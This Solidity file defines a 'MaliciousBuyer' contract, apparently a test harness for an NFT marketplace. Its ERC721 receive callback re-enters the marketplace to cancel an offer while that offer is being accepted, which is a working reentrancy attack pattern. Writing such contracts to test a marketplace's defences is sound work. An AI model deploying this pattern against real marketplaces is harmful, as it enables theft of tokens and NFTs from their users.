// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NFTMarketplace.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract MaliciousBuyer is IERC721Receiver {
    NFTMarketplace public marketplace;
    address public nftContract;

    constructor(address payable _marketplace, address _nftContract) {
        marketplace = NFTMarketplace(_marketplace);
        nftContract = _nftContract;
    }

    function createOffer(uint256 tokenId, uint256 price) external {
        IERC20 token = marketplace.paymentToken();
        token.transferFrom(msg.sender, address(this), price);
        token.approve(address(marketplace), price);
        marketplace.createOffer(nftContract, tokenId, 1, price);
    }

    function onERC721Received(
        address,
        address,
        uint256 tokenId,
        bytes calldata
    ) external override returns (bytes4) {
        // Re-enter to cancel the offer while it's being accepted!
        marketplace.cancelOffer(nftContract, tokenId);
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}
